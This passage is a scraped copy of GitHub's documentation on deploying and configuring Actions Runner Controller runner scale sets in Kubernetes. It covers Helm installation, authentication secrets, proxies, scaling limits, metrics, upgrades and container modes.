documentation.\nNote\nWith both options, you must set the ACTIONS_RUNNER_CONTAINER_HOOK_TEMPLATE environment variable in the runner container spec to point to the path of the YAML file mounted in the runner container.\nExample: Using config map to set securityContext\nCreate a config map in the same namespace as the runner pods. For example:\napiVersion: v1 kind: ConfigMap metadata: name: hook-extension namespace: arc-runners data: content: | metadata: annotations: example: \"extension\" spec: containers: - name: \"$job\" # Target the job container securityContext: runAsUser: 1000 \nThe .metadata.labels and metadata.annotations fields will be appended as is, unless their keys are reserved. You cannot override the .metadata.name and metadata.namespace fields.\nThe majority of the PodSpec fields are applied from the specified template, and will override the values passed from your Helm chart values.yaml file.\nIf you specify additional volumes they will be appended to the default volumes specified by the runner.\nThe spec.containers are merged based on the names assigned to them. \nIf the name of the container is $job: \nThe spec.containers.name and spec.containers.image fields are ignored.\nThe spec.containers.env, spec.containers.volumeMounts, and spec.containers.ports fields are appended to the default container spec created by the hook.\nThe rest of the fields are applied as provided.\nIf the name of the container is not $job, the fields will be added to the pod definition as they are.\nEnabling metrics\nNote\nMetrics for ARC are available as of version gha-runner-scale-set-0.5.0.\nARC can emit metrics about your runners, your jobs, and time spent on executing your workflows. Metrics can be used to identify congestion, monitor the health of your ARC deployment, visualize usage trends, optimize resource consumption, among many other use cases. Metrics are emitted by the controller-manager and listener pods in Prometheus format. For more information, see Exposition formats in the Prometheus documentation.\nTo enable metrics for ARC, configure the metrics property in the values.yaml file of the gha-runner-scale-set-controller chart.\nThe following is an example configuration.\nmetrics: controllerManagerAddr: \":8080\" listenerAddr: \":8080\" listenerEndpoint: \"/metrics\" \nNote\nIf the metrics: object is not provided or is commented out, the following flags will be applied to the controller-manager and listener pods with empty values: --metrics-addr, --listener-metrics-addr, --listener-metrics-endpoint. This will disable metrics for ARC.\nOnce these properties are configured, your controller-manager and listener pods emit metrics via the listenerEndpoint bound to the ports that you specify in your values.yaml file. In the above example, the endpoint is /metrics and the port is :8080. You can use this endpoint to scrape metrics from your controller-manager and listener pods.\nTo turn off metrics, update your values.yaml file by removing or commenting out the metrics: object and its properties.\nAvailable metrics for ARC\nThe following table shows the metrics emitted by the controller-manager and listener pods.\nNote\nThe metrics that the controller-manager emits pertain to the controller runtime and are not owned by GitHub.\nOwnerMetricTypeDescription\ncontroller-manager\tgha_controller_pending_ephemeral_runners\tgauge\tNumber of ephemeral runners in a pending state\t\ncontroller-manager\tgha_controller_running_ephemeral_runners\tgauge\tNumber of ephemeral runners in a running state\t\ncontroller-manager\tgha_controller_failed_ephemeral_runners\tgauge\tNumber of ephemeral runners in a failed state\t\ncontroller-manager\tgha_controller_running_listeners\tgauge\tNumber of listeners in a running state\t\nlistener\tgha_assigned_jobs\tgauge\tNumber of jobs assigned to the runner scale set\t\nlistener\tgha_running_jobs\tgauge\tNumber of jobs running or queued to run\t\nlistener\tgha_registered_runners\tgauge\tNumber of runners registered by the runner scale set\t\nlistener\tgha_busy_runners\tgauge\tNumber of registered runners currently running a job\t\nlistener\tgha_min_runners\tgauge\tMinimum number of runners configured for the runner scale set\t\nlistener\tgha_max_runners\tgauge\tMaximum number of runners configured for the runner scale set\t\nlistener\tgha_desired_runners\tgauge\tNumber of runners desired (scale up / down target) by the runner scale set\t\nlistener\tgha_idle_runners\tgauge\tNumber of registered runners not running a job\t\nlistener\tgha_started_jobs_total\tcounter\tTotal number of jobs started since the listener became ready [1]\t\nlistener\tgha_completed_jobs_total\tcounter\tTotal number of jobs completed since the listener became ready [1]\t\nlistener\tgha_job_startup_duration_seconds\thistogram\tNumber of seconds spent waiting for workflow job to get started on the runner owned by the runner scale set\t\nlistener\tgha_job_execution_duration_seconds\thistogram\tNumber of seconds spent executing workflow jobs by the runner scale set\t\n[1]: Listener metrics that have the counter type are reset when the listener pod restarts.\nUpgrading ARC\nBecause there is no support for upgrading or deleting CRDs with Helm, it is not possible to use Helm to upgrade ARC. For more information, see Custom Resource Definitions in the Helm documentation. To upgrade ARC to a newer version, you must complete the following steps.\nUninstall all installations of gha-runner-scale-set.\nWait for resources cleanup.\nUninstall ARC.\nIf there is a change in CRDs from the version you currently have installed, to the upgraded version, remove all CRDs associated with actions.github.com API group.\nReinstall ARC again.\nFor more information, see Deploying a runner scale set.\nIf you would like to upgrade ARC but are concerned about downtime, you can deploy ARC in a high availability configuration to ensure runners are always available. For more information, see High availability and automatic failover.\nNote\nTransitioning from the community supported version of ARC to the GitHub supported version is a substantial architectural change. The GitHub supported version involves a redesign of many components of ARC. It is not a minor software upgrade. For these reasons, we recommend testing the new versions in a staging environment that matches your production environment first. This will ensure stability and reliability of the setup before deploying in production.\nDeploying a canary image\nYou can test features before they are released by using canary releases of the controller-manager container image. Canary images are published with tag format canary-SHORT_SHA. For more information, see gha-runner-scale-set-controller on the Container registry.\nNote\nYou must use Helm charts on your local file system.\nYou cannot use the released Helm charts.\nUpdate the tag in the gha-runner-scale-set-controller values.yaml file to: canary-SHORT_SHA\nUpdate the field appVersion in the Chart.yaml file for gha-runner-scale-set to: canary-SHORT_SHA\nRe-install ARC using the updated Helm chart and values.yaml files.\nHigh availability and automatic failover\nARC can be deployed in a high availability (active-active) configuration. If you have two distinct Kubernetes clusters deployed in separate regions, you can deploy ARC in both clusters and configure runner scale sets to use the same runnerScaleSetName. In order to do this, each runner scale set must be assigned to a distinct runner group. For example, you can have two runner scale sets each named arc-runner-set, as long as one runner scale set belongs to runner-group-A and the other runner scale set belongs to runner-group-B. For information on assigning runner scale sets to runner groups, see Managing access to self-hosted runners using groups.\nIf both runner scale sets are online, jobs assigned to them will be distributed arbitrarily (assignment race). You cannot configure the job assignment algorithm. If one of the clusters goes down, the runner scale set in the other cluster will continue to acquire jobs normally without any intervention or configuration change.\nUsing ARC across organizations\nA single installation of Actions Runner Controller allows you to configure one or more runner scale sets. These runner scale sets can be registered to a repository, organization, or enterprise. You can also use runner groups to control the permissions boundaries of these runner scale sets.\nAs a best practice, create a unique namespace for each organization. You could also create a namespace for each runner group or each runner scale set. You can install as many runner scale sets as needed in each namespace. This will provide you the highest levels of isolation and improve your security. You can use GitHub Apps for authentication and define granular permissions for each runner scale set.\nLegal notice\nPortions have been adapted from https://github.com/actions/actions-runner-controller/ under the Apache-2.0 license:\nCopyright 2019 Moto Ishizawa Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-with-actions-runner-controller-deploying-runner-scale-sets-wi-9zajs.html",
  "markdown": "# Deploying runner scale sets with Actions Runner Controller\n\nLearn how to deploy runner scale sets with Actions Runner Controller, and use advanced configuration options to tailor Actions Runner Controller to your needs.\n\n[Legal notice](#legal-notice)\n\n## [About runner scale sets](#about-runner-scale-sets)\n\nRunner scale sets is a group of homogeneous runners that can be assigned jobs from GitHub Actions. The number of active runners owned by a runner scale set can be controlled by auto-scaling runner solutions such as Actions Runner Controller (ARC).\n\nYou can use runner groups to manage runner scale sets. Similar to self-hosted runners, you can add runner scale sets to existing runner groups. However, runner scale sets can belong to only one runner group at a time and can only have one label assigned to them. For more information on runner groups, see [Managing access to self-hosted runners using groups](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/managing-access-to-self-hosted-runners-using-groups).\n\nTo assign jobs to a runner scale set, you must configure your workflow to reference the runner scale set's name. For more information, see [Using Actions Runner Controller runners in a workflow](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/using-actions-runner-controller-runners-in-a-workflow).\n\n## [Deploying a runner scale set](#deploying-a-runner-scale-set)\n\nTo deploy a runner scale set, you must have ARC up and running. For more information, see [Quickstart for Actions Runner Controller](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/quickstart-for-actions-runner-controller).\n\nYou can deploy runner scale sets with ARC's Helm charts or by deploying the necessary manifests. Using ARC's Helm charts is the preferred method, especially if you do not have prior experience using ARC.\n\nNote\n\n*   As a security best practice, create your runner pods in a different namespace than the namespace containing your operator pods.\n*   As a security best practice, create Kubernetes secrets and pass the secret references. Passing your secrets in plain text via the CLI can pose a security risk.\n*   We recommend running production workloads in isolation. GitHub Actions workflows are designed to run arbitrary code, and using a shared Kubernetes cluster for production workloads could pose a security risk.\n*   Ensure you have implemented a way to collect and retain logs from the controller, listeners, and ephemeral runners.\n\n1.  To configure your runner scale set, run the following command in your terminal, using values from your ARC configuration.\n    \n    When you run the command, keep the following in mind.\n    \n    *   Update the `INSTALLATION_NAME` value carefully. You will use the installation name as the value of [`runs-on`](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idruns-on) in your workflows.\n        \n    *   Update the `NAMESPACE` value to the location you want the runner pods to be created.\n        \n    *   Set the `GITHUB_CONFIG_URL` value to the URL of your repository, organization, or enterprise. This is the entity that the runners will belong to.\n        \n    *   This example command installs the latest version of the Helm chart. To install a specific version, you can pass the `--version` argument with the version of the chart you want to install. You can find the list of releases in the [`actions-runner-controller`](https://github.com/actions/actions-runner-controller/pkgs/container/actions-runner-controller-charts%2Fgha-runner-scale-set) repository.\n        \n        Bash\n        \n        ```\n        INSTALLATION_NAME=\"arc-runner-set\"\n        NAMESPACE=\"arc-runners\"\n        GITHUB_CONFIG_URL=\"https://github.com/<your_enterprise/org/repo>\"\n        GITHUB_PAT=\"<PAT>\"\n        helm install \"${INSTALLATION_NAME}\" \\\n            --namespace \"${NAMESPACE}\" \\\n            --create-namespace \\\n            --set githubConfigUrl=\"${GITHUB_CONFIG_URL}\" \\\n            --set githubConfigSecret.github_token=\"${GITHUB_PAT}\" \\\n            oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set\n        ```\n        \n        For additional Helm configuration options, see [`values.yaml`](https://github.com/actions/actions-runner-controller/blob/master/charts/gha-runner-scale-set/values.yaml) in the ARC repository.\n        \n2.  To check your installation, run the following command in your terminal.\n    \n    You should see an output similar to the following.\n    \n    ```\n    NAME            NAMESPACE       REVISION        UPDATED                                 STATUS          CHART                                       APP VERSION\n    arc             arc-systems     1               2023-04-12 11:45:59.152090536 +0000 UTC deployed        gha-runner-scale-set-controller-0.4.0       0.4.0\n    arc-runner-set  arc-systems     1               2023-04-12 11:46:13.451041354 +0000 UTC deployed        gha-runner-scale-set-0.4.0                  0.4.0\n    ```\n    \n3.  To check the manager pod, run the following command in your terminal.\n    \n    Bash\n    \n    ```\n    kubectl get pods -n arc-systems\n    ```\n    \n    If the installation was successful, the pods will show the `Running` status.\n    \n    ```\n    NAME                                                   READY   STATUS    RESTARTS   AGE\n    arc-gha-runner-scale-set-controller-594cdc976f-m7cjs   1/1     Running   0          64s\n    arc-runner-set-754b578d-listener                       1/1     Running   0          12s\n    ```\n    \n\nIf your installation was not successful, see [Troubleshooting Actions Runner Controller errors](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/troubleshooting-actions-runner-controller-errors) for troubleshooting information.\n\n## [Using advanced configuration options](#using-advanced-configuration-options)\n\nARC offers several advanced configuration options.\n\n### [Configuring the runner scale set name](#configuring-the-runner-scale-set-name)\n\nNote\n\nRunner scale set names are unique within the runner group they belong to. If you want to deploy multiple runner scale sets with the same name, they must belong to different runner groups.\n\nTo configure the runner scale set name, you can define an `INSTALLATION_NAME` or set the value of `runnerScaleSetName` in your copy of the [`values.yaml`](https://github.com/actions/actions-runner-controller/blob/master/charts/gha-runner-scale-set/values.yaml) file.\n\n```\n## The name of the runner scale set to create, which defaults to the Helm release name\nrunnerScaleSetName: \"my-runners\"\n```\n\nMake sure to pass the `values.yaml` file in your `helm install` command. See the [Helm Install](https://helm.sh/docs/helm/helm_install/) documentation for more details.\n\n### [Choosing runner destinations](#choosing-runner-destinations)\n\nRunner scale sets can be deployed at the repository, organization, or enterprise levels.\n\nTo deploy runner scale sets to a specific level, set the value of `githubConfigUrl` in your copy of the `values.yaml` to the URL of your repository, organization, or enterprise.\n\nThe following example shows how to configure ARC to add runners to `octo-org/octo-repo`.\n\n```\ngithubConfigUrl: \"https://github.com/octo-ent/octo-org/octo-repo\"\n```\n\nFor additional Helm configuration options, see [`values.yaml`](https://github.com/actions/actions-runner-controller/blob/master/charts/gha-runner-scale-set/values.yaml) in the ARC repository.\n\n### [Using a GitHub App for authentication](#using-a-github-app-for-authentication)\n\nIf you are not using enterprise-level runners, you can use GitHub Apps to authenticate with the GitHub API. For more information, see [Authenticating to the GitHub API](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/authenticating-to-the-github-api).\n\nNote\n\nGiven the security risk associated with exposing your private key in plain text in a file on disk, we recommend creating a Kubernetes secret and passing the reference instead.\n\nYou can either create a Kubernetes secret, or specify values in your [`values.yaml`](https://github.com/actions/actions-runner-controller/blob/master/charts/gha-runner-scale-set/values.yaml) file.\n\n#### [Option 1: Create a Kubernetes secret (recommended)](#option-1-create-a-kubernetes-secret-recommended)\n\nOnce you have created your GitHub App, create a Kubernetes secret and pass the reference to that secret in your copy of the [`values.yaml`](https://github.com/actions/actions-runner-controller/blob/master/charts/gha-runner-scale-set/values.yaml) file.\n\nNote\n\nCreate the secret in the same namespace where the `gha-runner-scale-set` chart is installed. In this example, the namespace is `arc-runners` to match the quickstart documentation. For more information, see [Quickstart for Actions Runner Controller](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/quickstart-for-actions-runner-controller#configuring-a-runner-scale-set).\n\n```\nkubectl create secret generic pre-defined-secret \\\n  --namespace=arc-runners \\\n  --from-literal=github_app_id=123456 \\\n  --from-literal=github_app_installation_id=654321 \\\n  --from-file=github_app_private_key=private-key.pem\n```\n\nIn your copy of the [`values.yaml`](https://github.com/actions/actions-runner-controller/blob/master/charts/gha-runner-scale-set/values.yaml) pass the secret name as a reference.\n\n```\ngithubConfigSecret: pre-defined-secret\n```\n\n#### [Option 2: Specify values in your `values.yaml` file](#option-2-specify-values-in-your-valuesyaml-file)\n\nAlternatively, you can specify the values of `app_id`, `installation_id` and `private_key` in your copy of the [`values.yaml`](https://github.com/actions/actions-runner-controller/blob/master/charts/gha-runner-scale-set/values.yaml) file.\n\n```\n## githubConfigSecret is the Kubernetes secret to use when authenticating with GitHub API.\n## You can choose to use a GitHub App or a personal access token (classic)\ngithubConfigSecret:\n  ## GitHub Apps Configuration\n  ## IDs must be strings, use quotes\n  github_app_id: \"123456\"\n  github_app_installation_id: \"654321\"\n  github_app_private_key: |\n    -----BEGIN RSA PRIVATE KEY-----\n    ...\n    HkVN9...\n    ...\n    -----END RSA PRIVATE KEY-----\n```\n\nFor additional Helm configuration options, see [`values.yaml`](https://github.com/actions/actions-runner-controller/blob/master/charts/gha-runner-scale-set/values.yaml) in the ARC repository.\n\n### [Managing access with runner groups](#managing-access-with-runner-groups)\n\nYou can use runner groups to control which organizations or repositories have access to your runner scale sets. For more information on runner groups, see [Managing access to self-hosted runners using groups](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/managing-access-to-self-hosted-runners-using-groups).\n\nTo add a runner scale set to a runner group, you must already have a runner group created. Then set the `runnerGroup` property in your copy of the `values.yaml` file. The following example adds a runner scale set to the Octo-Group runner group.\n\n```\nrunnerGroup: \"Octo-Group\"\n```\n\nFor additional Helm configuration options, see [`values.yaml`](https://github.com/actions/actions-runner-controller/blob/master/charts/gha-runner-scale-set/values.yaml) in the ARC repository.\n\n### [Configuring an outbound proxy](#configuring-an-outbound-proxy)\n\nTo force HTTP traffic for the controller and runners to go through your outbound proxy, set the following properties in your Helm chart.\n\n```\nproxy:\n  http:\n    url: http://proxy.com:1234\n    credentialSecretRef: proxy-auth # a Kubernetes secret with `username` and `password` keys\n  https:\n    url: http://proxy.com:1234\n    credentialSecretRef: proxy-auth # a Kubernetes secret with `username` and `password` keys\n  noProxy:\n    - example.com\n    - example.org\n```\n\nARC supports using anonymous or authenticated proxies. If you use authenticated proxies, you will need to set the `credentialSecretRef` value to reference a Kubernetes secret. You can create a secret with your proxy credentials with the following command.\n\nNote\n\nCreate the secret in the same namespace where the `gha-runner-scale-set` chart is installed. In this example, the namespace is `arc-runners` to match the quickstart documentation. For more information, see [Quickstart for Actions Runner Controller](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/quickstart-for-actions-runner-controller#configuring-a-runner-scale-set).\n\nBash\n\n```\n  kubectl create secret generic proxy-auth \\\n    --namespace=arc-runners \\\n    --from-literal=username=proxyUsername \\\n    --from-literal=password=proxyPassword \\\n```\n\nFor additional Helm configuration options, see [`values.yaml`](https://github.com/actions/actions-runner-controller/blob/master/charts/gha-runner-scale-set/values.yaml) in the ARC repository.\n\n### [Setting the maximum and minimum number of runners](#setting-the-maximum-and-minimum-number-of-runners)\n\nThe `maxRunners` and `minRunners` properties provide you with a range of options to customize your ARC setup.\n\nNote\n\nARC does not support scheduled maximum and minimum configurations. You can use a cronjob or any other scheduling solution to update the configuration on a schedule.\n\n#### [Example: Unbounded number of runners](#example-unbounded-number-of-runners)\n\nIf you comment out both the `maxRunners` and `minRunners` properties, ARC will scale up to the number of jobs assigned to the runner scale set and will scale down to 0 if there aren't any active jobs.\n\n```\n## maxRunners is the max number of runners the auto scaling runner set will scale up to.\n# maxRunners: 0\n\n## minRunners is the min number of idle runners. The target number of runners created will be\n## calculated as a sum of minRunners and the number of jobs assigned to the scale set.\n# minRunners: 0\n```\n\n#### [Example: Minimum number of runners](#example-minimum-number-of-runners)\n\nYou can set the `minRunners` property to any number and ARC will make sure there is always the specified number of runners active and available to take jobs assigned to the runner scale set at all times.\n\n```\n## maxRunners is the max number of runners the auto scaling runner set will scale up to.\n# maxRunners: 0\n\n## minRunners is the min number of idle runners. The target number of runners created will be\n## calculated as a sum of minRunners and the number of jobs assigned to the scale set.\nminRunners: 20\n```\n\n#### [Example: Set maximum and minimum number of runners](#example-set-maximum-and-minimum-number-of-runners)\n\nIn this configuration, Actions Runner Controller will scale up to a maximum of `30` runners and will scale down to `20` runners when the jobs are complete.\n\nNote\n\nThe value of `minRunners` can never exceed that of `maxRunners`, unless `maxRunners` is commented out.\n\n```\n## maxRunners is the max number of runners the auto scaling runner set will scale up to.\nmaxRunners: 30\n\n## minRunners is the min number of idle runners. The target number of runners created will be\n## calculated as a sum of minRunners and the number of jobs assigned to the scale set.\nminRunners: 20\n```\n\n#### [Example: Jobs queue draining](#example-jobs-queue-draining)\n\nIn certain scenarios you might want to drain the jobs queue to troubleshoot a problem or to perform maintenance on your cluster. If you set both properties to `0`, Actions Runner Controller will not create new runner pods when new jobs are available and assigned.\n\n```\n## maxRunners is the max number of runners the auto scaling runner set will scale up to.\nmaxRunners: 0\n\n## minRunners is the min number of idle runners. The target number of runners created will be\n## calculated as a sum of minRunners and the number of jobs assigned to the scale set.\nminRunners: 0\n```\n\n### [Custom TLS certificates](#custom-tls-certificates)\n\nNote\n\nIf you are using a custom runner image that is not based on the `Debian` distribution, the following instructions will not work.\n\nSome environments require TLS certificates that are signed by a custom certificate authority (CA). Since the custom certificate authority certificates are not bundled with the controller or runner containers, you must inject them into their respective trust stores.\n\n```\ngithubServerTLS:\n  certificateFrom:\n    configMapKeyRef:\n      name: config-map-name\n      key: ca.crt\n  runnerMountPath: /usr/local/share/ca-certificates/\n```\n\nWhen you do this, ensure you are using the Privacy Enhanced Mail (PEM) format and that the extension of your certificate is `.crt`. Anything else will be ignored.\n\nThe controller executes the following actions.\n\n*   Creates a `github-server-tls-cert` volume containing the certificate specified in `certificateFrom`.\n*   Mounts that volume on path `runnerMountPath/<certificate name>`.\n*   Sets the `NODE_EXTRA_CA_CERTS` environment variable to that same path.\n*   Sets the `RUNNER_UPDATE_CA_CERTS` environment variable to `1` (as of version `2.303.0`, this will instruct the runner to reload certificates on the host).\n\nARC observes values set in the runner pod template and does not overwrite them.\n\nFor additional Helm configuration options, see [`values.yaml`](https://github.com/actions/actions-runner-controller/blob/master/charts/gha-runner-scale-set/values.yaml) in the ARC repository.\n\n### [Using a private container registry](#using-a-private-container-registry)\n\nWarning\n\nThis Actions Runner Controller customization option may be outside the scope of what GitHub Support can assist with and may cause unexpected behavior when configured incorrectly.\n\nFor more information about what GitHub Support can assist with, see [About support for Actions Runner Controller](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/about-support-for-actions-runner-controller).\n\nTo use a private container registry, you can copy the controller image and runner image to your private container registry. Then configure the links to those images and set the `imagePullPolicy` and `imagePullSecrets` values.\n\n#### [Configuring the controller image](#configuring-the-controller-image)\n\nYou can update your copy of the [`values.yaml`](https://github.com/actions/actions-runner-controller/blob/master/charts/gha-runner-scale-set-controller/values.yaml) file and set the `image` properties as follows.\n\n```\nimage:\n  repository: \"custom-registry.io/gha-runner-scale-set-controller\"\n  pullPolicy: IfNotPresent\n  # Overrides the image tag whose default is the chart appVersion.\n  tag: \"0.4.0\"\n\nimagePullSecrets:\n  - name: <registry-secret-name>\n```\n\nThe listener container inherits the `imagePullPolicy` defined for the controller.\n\n#### [Configuring the runner image](#configuring-the-runner-image)\n\nYou can update your copy of the [`values.yaml`](https://github.com/actions/actions-runner-controller/blob/master/charts/gha-runner-scale-set/values.yaml) file and set the `template.spec` properties as follows.\n\n```\ntemplate:\n  spec:\n    containers:\n      - name: runner\n        image: \"custom-registry.io/actions-runner:latest\"\n        imagePullPolicy: Always\n        command: [\"/home/runner/run.sh\"]\n    imagePullSecrets:\n      - name: <registry-secret-name>\n```\n\nFor additional Helm configuration options, see [`values.yaml`](https://github.com/actions/actions-runner-controller/blob/master/charts/gha-runner-scale-set/values.yaml) in the ARC repository.\n\n### [Updating the pod specification for the runner pod](#updating-the-pod-specification-for-the-runner-pod)\n\nWarning\n\nThis Actions Runner Controller customization option may be outside the scope of what GitHub Support can assist with and may cause unexpected behavior when configured incorrectly.\n\nFor more information about what GitHub Support can assist with, see [About support for Actions Runner Controller](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/about-support-for-actions-runner-controller).\n\nYou can fully customize the PodSpec of the runner pod and the controller will apply the configuration you specify. The following is an example pod specification.\n\n```\ntemplate:\n  spec:\n    containers:\n      - name: runner\n        image: ghcr.io/actions/actions-runner:latest\n        command: [\"/home/runner/run.sh\"]\n        resources:\n          limits:\n            cpu: 500m\n            memory: 512Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          allowPrivilegeEscalation: false\n          capabilities:\n            add:\n              - NET_ADMIN\n```\n\nFor additional Helm configuration options, see [`values.yaml`](https://github.com/actions/actions-runner-controller/blob/master/charts/gha-runner-scale-set/values.yaml) in the ARC repository.\n\n### [Updating the pod specification for the listener pod](#updating-the-pod-specification-for-the-listener-pod)\n\nWarning\n\nThis Actions Runner Controller customization option may be outside the scope of what GitHub Support can assist with and may cause unexpected behavior when configured incorrectly.\n\nFor more information about what GitHub Support can assist with, see [About support for Actions Runner Controller](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/about-support-for-actions-runner-controller).\n\nYou can customize the PodSpec of the listener pod and the controller will apply the configuration you specify. The following is an example pod specification.\n\nNote\n\nIt's important to not change the `listenerTemplate.spec.containers.name` value of the listener container. Otherwise, the configuration you specify will be applied to a new side-car container.\n\n```\nlistenerTemplate:\n  spec:\n    containers:\n    # If you change the name of the container, the configuration will not be applied to the listener,\n    # and it will be treated as a side-car container.\n    - name: listener\n      securityContext:\n        runAsUser: 1000\n      resources:\n        limits:\n          cpu: \"1\"\n          memory: 1Gi\n        requests:\n          cpu: \"1\"\n          memory: 1Gi\n```\n\nFor additional Helm configuration options, see [`values.yaml`](https://github.com/actions/actions-runner-controller/blob/master/charts/gha-runner-scale-set/values.yaml) in the ARC repository.\n\n## [Using Docker-in-Docker or Kubernetes mode for containers](#using-docker-in-docker-or-kubernetes-mode-for-containers)\n\nWarning\n\nThis Actions Runner Controller customization option may be outside the scope of what GitHub Support can assist with and may cause unexpected behavior when configured incorrectly.\n\nFor more information about what GitHub Support can assist with, see [About support for Actions Runner Controller](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/about-support-for-actions-runner-controller).\n\nIf you are using container jobs and services or container actions, the `containerMode` value must be set to `dind` or `kubernetes`.\n\n*   For more information on container jobs and services, see [Running jobs in a container](https://docs.github.com/en/actions/using-jobs/running-jobs-in-a-container).\n*   For more information on container actions, see [Creating a Docker container action](https://docs.github.com/en/actions/creating-actions/creating-a-docker-container-action).\n\n### [Using Docker-in-Docker mode](#using-docker-in-docker-mode)\n\nNote\n\nThe Docker-in-Docker container requires privileged mode. For more information, see [Configure a Security Context for a Pod or Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/) in the Kubernetes documentation.\n\nBy default, the `dind` container uses the `docker:dind` image, which runs the Docker daemon as root. You can replace this image with `docker:dind-rootless` as long as you are aware of the [known limitations](https://docs.docker.com/engine/security/rootless/#known-limitations) and run the pods with `--privileged` mode. To learn how to customize the Docker-in-Docker configuration, see [Customizing container modes](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller#customizing-container-modes).\n\nDocker-in-Docker mode is a configuration that allows you to run Docker inside a Docker container. In this configuration, for each runner pod created, ARC creates the following containers.\n\n*   An `init` container\n*   A `runner` container\n*   A `dind` container\n\nTo enable Docker-in-Docker mode, set the `containerMode.type` to `dind` as follows.\n\n```\ncontainerMode:\n  type: \"dind\"\n```\n\nThe `template.spec` will be updated to the following default configuration.\n\n```\ntemplate:\n  spec:\n    initContainers:\n      - name: init-dind-externals\n        image: ghcr.io/actions/actions-runner:latest\n        command:\n          [\"cp\", \"-r\", \"/home/runner/externals/.\", \"/home/runner/tmpDir/\"]\n        volumeMounts:\n          - name: dind-externals\n            mountPath: /home/runner/tmpDir\n    containers:\n      - name: runner\n        image: ghcr.io/actions/actions-runner:latest\n        command: [\"/home/runner/run.sh\"]\n        env:\n          - name: DOCKER_HOST\n            value: unix:///var/run/docker.sock\n        volumeMounts:\n          - name: work\n            mountPath: /home/runner/_work\n          - name: dind-sock\n            mountPath: /var/run\n      - name: dind\n        image: docker:dind\n        args:\n          - dockerd\n          - --host=unix:///var/run/docker.sock\n          - --group=$(DOCKER_GROUP_GID)\n        env:\n          - name: DOCKER_GROUP_GID\n            value: \"123\"\n        securityContext:\n          privileged: true\n        volumeMounts:\n          - name: work\n            mountPath: /home/runner/_work\n          - name: dind-sock\n            mountPath: /var/run\n          - name: dind-externals\n            mountPath: /home/runner/externals\n    volumes:\n      - name: work\n        emptyDir: {}\n      - name: dind-sock\n        emptyDir: {}\n      - name: dind-externals\n        emptyDir: {}\n```\n\nThe values in `template.spec` are automatically injected and cannot be overridden. If you want to customize this setup, you must unset `containerMode.type`, then copy this configuration and apply it directly in your copy of the [`values.yaml`](https://github.com/actions/actions-runner-controller/blob/master/charts/gha-runner-scale-set/values.yaml) file.\n\nFor additional Helm configuration options, see [`values.yaml`](https://github.com/actions/actions-runner-controller/blob/master/charts/gha-runner-scale-set/values.yaml) in the ARC repository.\n\n### [Using Kubernetes mode](#using-kubernetes-mode)\n\nIn Kubernetes mode, ARC uses runner container hooks to create a new pod in the same namespace to run the service, container job, or action.\n\n#### [Prerequisites](#prerequisites)\n\nKubernetes mode relies on persistent volumes to share job details between the runner pod and the container job pod. For more information, see the [Persistent Volumes](https://kubernetes.io/docs/concepts/storage/persistent-volumes/) section in the Kubernetes documentation.\n\nTo use Kubernetes mode, you must do the following.\n\n*   Create persistent volumes available for the runner pods to claim.\n*   Use a solution to automatically provision persistent volumes on demand.\n\nFor testing, you can use a solution like [OpenEBS](https://github.com/openebs/openebs).\n\n#### [Configuring Kubernetes mode](#configuring-kubernetes-mode)\n\nTo enable Kubernetes mode, set the `containerMode.type` to `kubernetes` in your [`values.yaml`](https://github.com/actions/actions-runner-controller/blob/master/charts/gha-runner-scale-set/values.yaml) file.\n\n```\ncontainerMode:\n  type: \"kubernetes\"\n  kubernetesModeWorkVolumeClaim:\n    accessModes: [\"ReadWriteOnce\"]\n    storageClassName: \"dynamic-blob-storage\"\n    resources:\n      requests:\n        storage: 1Gi\n```\n\nFor additional Helm configuration options, see [`values.yaml`](https://github.com/actions/actions-runner-controller/blob/master/charts/gha-runner-scale-set/values.yaml) in the ARC repository.\n\nNote\n\nWhen Kubernetes mode is enabled, workflows that are not configured with a container job will fail with an error similar to:\n\n```\nJobs without a job container are forbidden on this runner, please add a 'container:' to your job or contact your self-hosted runner administrator.\n```\n\nTo allow jobs without a job container to run, set `ACTIONS_RUNNER_REQUIRE_JOB_CONTAINER` to `false` on your runner container. This instructs the runner to disable this check.\n\n```\ntemplate:\n  spec:\n    containers:\n      - name: runner\n        image: ghcr.io/actions/actions-runner:latest\n        command: [\"/home/runner/run.sh\"]\n        env:\n          - name: ACTIONS_RUNNER_REQUIRE_JOB_CONTAINER\n            value: \"false\"\n```\n\n### [Customizing container modes](#customizing-container-modes)\n\nWhen you set the `containerMode` in the `values.yaml` file for the [`gha-runner-scale-set` helm chart](https://github.com/actions/actions-runner-controller/blob/5347e2c2c80fbc45be7390eab117e861d30776d1/charts/gha-runner-scale-set/values.yaml#L77), you can use either of the following values:\n\n*   `dind` or\n*   `kubernetes`\n\nDepending on which value 